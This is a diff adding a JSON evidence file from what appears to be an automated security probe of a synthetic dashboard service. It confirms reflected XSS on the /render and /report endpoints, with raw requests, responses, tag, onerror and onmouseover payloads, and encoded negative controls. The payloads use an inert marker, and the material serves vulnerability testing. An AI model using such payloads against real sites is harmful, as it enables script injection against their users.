@@ -1,0 +1,114 @@
+[
+  {
+    "finding_key": "svc-dashboard/render-reflected-xss",
+    "intent_id": "INT-r27-0029",
+    "probe": "artifacts/w3_dash_xss.py",
+    "probe_output": "artifacts/w3_dash_xss.out",
+    "guard_timestamp": "2026-10-23T16:45:00Z",
+    "raw_request": "GET /render?tpl=<b>dash8k2</b> HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n",
+    "resp_status": 200,
+    "resp_headers": {
+      "server": "BaseHTTP/0.6 Python/3.12.14",
+      "date": "Fri, 09 Oct 2026 15:57:40 GMT",
+      "content-type": "text/html; charset=utf-8",
+      "content-length": "66"
+    },
+    "resp_body_excerpt": "<html>render GTSSTI-02 synthetic ssti render <b>dash8k2</b></html>",
+    "matcher_words": ["dash8k2", "<b>dash8k2</b>"],
+    "auth_context": "anon",
+    "executive_hits": {
+      "tag-raw": {
+        "payload": "<b>dash8k2</b>",
+        "raw_request": "GET /render?tpl=<b>dash8k2</b> HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n",
+        "structure_intact_in_body": true
+      },
+      "event-raw": {
+        "payload": "<img/src=x/onerror=dash8k2>",
+        "raw_request": "GET /render?tpl=<img/src=x/onerror=dash8k2> HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n",
+        "structure_intact_in_body": true,
+        "resp_body_excerpt": "<html>render GTSSTI-02 synthetic ssti render <img/src=x/onerror=dash8k2></html>"
+      },
+      "quote-raw-ns": {
+        "payload": "\"onmouseover=dash8k2\"",
+        "note": "引号闭合形无空格适配（HTTP 请求行禁空格，委派单原形含空格仅编码可发）；引号逐字节透传，反射点为元素上下文",
+        "structure_intact_in_body": true
+      }
+    },
+    "encoded_control_negative": {
+      "tag-enc-ctl": {
+        "payload": "%3Cb%3Edash8k2%3C%2Fb%3E",
+        "raw_request": "GET /render?tpl=%3Cb%3Edash8k2%3C%2Fb%3E HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n",
+        "resp_status": 200,
+        "resp_body_excerpt": "<html>render GTSSTI-02 synthetic ssti render %3Cb%3Edash8k2%3C%2Fb%3E</html>",
+        "structure_intact_in_body": false,
+        "executable": false
+      },
+      "quote-enc-ctl": {
+        "payload": "%22%20onmouseover%3Ddash8k2%20%22",
+        "raw_request": "GET /render?tpl=%22%20onmouseover%3Ddash8k2%20%22 HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n",
+        "resp_status": 200,
+        "resp_body_excerpt": "<html>render GTSSTI-02 synthetic ssti render %22%20onmouseover%3Ddash8k2%20%22</html>",
+        "structure_intact_in_body": false,
+        "executable": false
+      },
+      "mechanism": "服务端不 urldecode（编码串逐字节原样回显）且不做 HTML 转义——只有原形直发的载荷以可执行结构落到响应体"
+    },
+    "verdict": "confirmed"
+  },
+  {
+    "finding_key": "svc-dashboard/report-reflected-xss",
+    "intent_id": "INT-r27-0029",
+    "probe": "artifacts/w3_dash_xss.py",
+    "probe_output": "artifacts/w3_dash_xss.out",
+    "guard_timestamp": "2026-10-23T16:45:00Z",
+    "raw_request": "GET /report?name=<b>dash8k2</b> HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n",
+    "resp_status": 200,
+    "resp_headers": {
+      "server": "BaseHTTP/0.6 Python/3.12.14",
+      "date": "Fri, 09 Oct 2026 15:57:42 GMT",
+      "content-type": "text/html; charset=utf-8",
+      "content-length": "66"
+    },
+    "resp_body_excerpt": "<html>report GTSSTI-01 synthetic ssti render <b>dash8k2</b></html>",
+    "matcher_words": ["dash8k2", "<b>dash8k2</b>"],
+    "auth_context": "anon",
+    "executive_hits": {
+      "tag-raw": {
+        "payload": "<b>dash8k2</b>",
+        "raw_request": "GET /report?name=<b>dash8k2</b> HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n",
+        "structure_intact_in_body": true
+      },
+      "event-raw": {
+        "payload": "<img/src=x/onerror=dash8k2>",
+        "raw_request": "GET /report?name=<img/src=x/onerror=dash8k2> HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n",
+        "structure_intact_in_body": true,
+        "resp_body_excerpt": "<html>report GTSSTI-01 synthetic ssti render <img/src=x/onerror=dash8k2></html>"
+      },
+      "quote-raw-ns": {
+        "payload": "\"onmouseover=dash8k2\"",
+        "note": "引号闭合形无空格适配（HTTP 请求行禁空格，委派单原形含空格仅编码可发）；引号逐字节透传，反射点为元素上下文",
+        "structure_intact_in_body": true
+      }
+    },
+    "encoded_control_negative": {
+      "tag-enc-ctl": {
+        "payload": "%3Cb%3Edash8k2%3C%2Fb%3E",
+        "raw_request": "GET /report?name=%3Cb%3Edash8k2%3C%2Fb%3E HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n",
+        "resp_status": 200,
+        "resp_body_excerpt": "<html>report GTSSTI-01 synthetic ssti render %3Cb%3Edash8k2%3C%2Fb%3E</html>",
+        "structure_intact_in_body": false,
+        "executable": false
+      },
+      "quote-enc-ctl": {
+        "payload": "%22%20onmouseover%3Ddash8k2%20%22",
+        "raw_request": "GET /report?name=%22%20onmouseover%3Ddash8k2%20%22 HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n",
+        "resp_status": 200,
+        "resp_body_excerpt": "<html>report GTSSTI-01 synthetic ssti render %22%20onmouseover%3Ddash8k2%20%22</html>",
+        "structure_intact_in_body": false,
+        "executable": false
+      },
+      "mechanism": "与 /render 同机制：不 urldecode + 不 HTML 转义，原形直发即落可执行结构"
+    },
+    "verdict": "confirmed"
+  }
+]
